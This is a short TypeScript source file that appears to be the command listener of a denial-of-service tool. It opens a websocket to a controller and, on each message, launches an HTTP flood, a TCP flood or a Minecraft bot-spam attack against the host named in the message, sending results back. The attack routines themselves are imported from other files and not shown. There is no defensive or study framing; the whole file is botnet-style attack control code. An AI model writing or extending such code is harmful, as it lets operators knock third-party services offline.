import websocket from 'ws';
import {parseToJson} from "../utils/parseToJson.ts";
import {HttpFloodService} from "./http-flood-service.ts";
import {TcpFloodService} from "./tcp-flood-service.ts";
import {BotService} from "./bot-service.ts";
export async function wsListenerService(){
    const ws = new websocket("ws://localhost:8080/api/ws/listener");
    ws.on("message", async (message)=>{
       const payload = parseToJson(message.toString("utf-8"));
           if(payload instanceof  Object){
               const attackType = payload.attackType;
               payload.ws = ws;
              if(attackType === "http-flood"){
                  const res = await HttpFloodService.httpFloodAttack(payload.host, payload.packetSize, payload.time, ws);
                  ws.send(res);
              } else if (attackType === "tcp-flood"){
                  const res = await TcpFloodService.tcpFloodAttack(payload);
                  ws.send(res);
              } else if(attackType === "mc-bots"){
                  const res = await BotService.spamBots(payload);
                  ws.send(res);
              }
           }

    });
}